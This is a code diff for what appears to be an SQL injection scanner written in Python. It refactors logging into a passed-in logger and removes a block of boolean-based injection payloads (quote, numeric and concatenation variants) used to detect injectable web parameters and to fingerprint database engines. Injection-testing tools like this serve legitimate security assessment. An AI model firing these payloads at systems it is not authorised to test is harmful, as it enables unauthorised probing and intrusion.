@@ -6,11 +6,10 @@
 from injection import *
 from misc import *
 from sqResult import *
-from database import *
 import urllib
-import logging
 import sys
 import copy
+import database
 
 
 
@@ -19,9 +18,10 @@ class Test:
 		pass
 
 class InjectTry:
-	def __init__(self,type):
+	def __init__(self,type,logger):
 		self.type=type
 		self.tryTests=[]
+		self.logger=logger
 
 	def addTry (self,pattern,tryCompareEqual):
 		self.tryTests.append((urllib.quote(pattern),tryCompareEqual))
@@ -37,14 +37,14 @@ class InjectTry:
 		for payload,result in self.tryTests:
 			var.append(payload)
 
-			logging.debug("Trying injection in - %s - %s - %s" % (method,var.name,urllib.unquote(payload)))
+			self.logger.debug("Trying injection in - %s - %s - %s" % (method,var.name,urllib.unquote(payload)))
 
 			req.perform()
 			req.response.Substitute(payload," ")
 
-			for i in FingerTests:       ### Este bucle es para buscar errores de SQL en los resultados
+			for i in database.FingerTests:       ### Este bucle es para buscar errores de SQL en los resultados
 				if i.searchError(req.response):
-					logging.debug("Error Message FOUND - %s" % (i.getName()))
+					self.logger.debug("Error Message FOUND - %s" % (i.getName()))
 					sqRObj.setError(i.getName())
 
 			tmpreq=copy.deepcopy(req)
@@ -53,14 +53,14 @@ class InjectTry:
 					
 			if sqRObj.equalResponse(req.response)!=result:
 				testFailed=True
-				logging.debug("FAILED")
+				self.logger.debug("FAILED")
 				break
-			logging.debug("DONE")
+			self.logger.debug("DONE")
 
 
 
 		if not testFailed:
-			logging.debug("Parameter INJECTABLE - %s - %s - %s" % (str(self.type),method,var.name))
+			self.logger.debug("Parameter INJECTABLE - %s - %s - %s" % (str(self.type),method,var.name))
 			sqRObj.setType(self.type)
 
 
@@ -87,13 +87,14 @@ class InjectionTest(Test):
 		
 
 class FingerprintTest:
-	def __init__(self,tests):
+	def __init__(self,tests,logger):
 		self.tests=tests
+		self.logger=logger
 
 	def launch(self,sqRObj):
 		res=False
 		for i in self.tests:
-			logging.debug("Trying %s" % (str(i)))
+			self.logger.debug("Trying %s" % (str(i)))
 			res=self.TryDB(i,sqRObj)
 			if res:
 				return True,None
@@ -111,8 +112,8 @@ class FingerprintTest:
 		method=sqRObj.getMethod()
 		req=sqRObj.getReq()
 
-		logging.debug("Variable - %s - %s" % (method,var.name))
-		logging.debug("Payloads to try: %s - %s" % (urllib.unquote(payload1),urllib.unquote(payload2)))
+		self.logger.debug("Variable - %s - %s" % (method,var.name))
+		self.logger.debug("Payloads to try: %s - %s" % (urllib.unquote(payload1),urllib.unquote(payload2)))
 
 	
 		var.append(payload1)		
@@ -124,7 +125,7 @@ class FingerprintTest:
 		testPassed=False
 
 		if sqRObj.equalResponse(req.response):
-			logging.debug("Payloads one DONE" )
+			self.logger.debug("Payloads one DONE" )
 			var.restore()
 			var.append(payload2)
 	
@@ -132,10 +133,10 @@ class FingerprintTest:
 			req.response.Substitute(payload2," ")
 
 			if sqRObj.equalResponse(req.response):
-				logging.debug("Payload two DONE - Fingerprint on variable - %s - %s - %s" % (method,var.name,db.getName()))
+				self.logger.debug("Payload two DONE - Fingerprint on variable - %s - %s - %s" % (method,var.name,db.getName()))
 				testPassed=True
 			else:
-				logging.debug("Payload two FAILED!!!! - Not fingerprint on variable - %s - %s - %s" % (method,var,db.getName()))
+				self.logger.debug("Payload two FAILED!!!! - Not fingerprint on variable - %s - %s - %s" % (method,var,db.getName()))
 
 		var.restore()
 
@@ -145,58 +146,3 @@ class FingerprintTest:
 
 		return False
 
-
-
-FingerTests=[]
-FingerTests.append(MysqlDB)
-FingerTests.append(MSSQLDB)
-FingerTests.append(OracleDB)
-FingerTests.append(DB2DB)
-FingerTests.append(PostgreSQLDB)
-FingerTests.append(InformixDB)
-FingerTests.append(SybaseDB)
-FingerTests.append(MSAccessDB)
-FingerTests.append(PointbaseDB)
-FingerTests.append(SQLiteDB)
-
-
-InjTests=[]
-tmp=InjectTry(TUnescaped)
-tmp.addTry(" and 1=1",True)
-tmp.addTry(" and 1=2",False)
-tmp.addTry(" and NoVale",False)
-InjTests.append(tmp)
-
-tmp=InjectTry(TSingleQuote)
-tmp.addTry("' and '1'='1",True)
-tmp.addTry("' and '1'='2",False)
-tmp.addTry("' and NoVale",False)
-InjTests.append(tmp)
-
-tmp=InjectTry(TDoubleQuote)
-tmp.addTry("\" and \"1\"=\"1",True)
-tmp.addTry("\" and \"1\"=\"2",False)
-tmp.addTry("\" and NoVale",False)
-InjTests.append(tmp)
-
-tmp=InjectTry(TNumeric)
-tmp.addTry("-21+21",True)
-tmp.addTry("-21",False)
-tmp.addTry("-NoVale",False)
-InjTests.append(tmp)
-
-tmp=InjectTry(TConcatPipe)
-tmp.addTry("'||lower('')||'",True)
-tmp.addTry("'||'21",False)
-tmp.addTry("'||Novale",False)
-InjTests.append(tmp)
-
-tmp=InjectTry(TConcatPlus)
-tmp.addTry("'+lower('')+'",True)
-tmp.addTry("'+'21",False)
-tmp.addTry("'+Novale",False)
-InjTests.append(tmp)
-
-
-INJECTIONTESTS=InjectionTest(InjTests)
-FINGERTESTS=FingerprintTest(FingerTests)
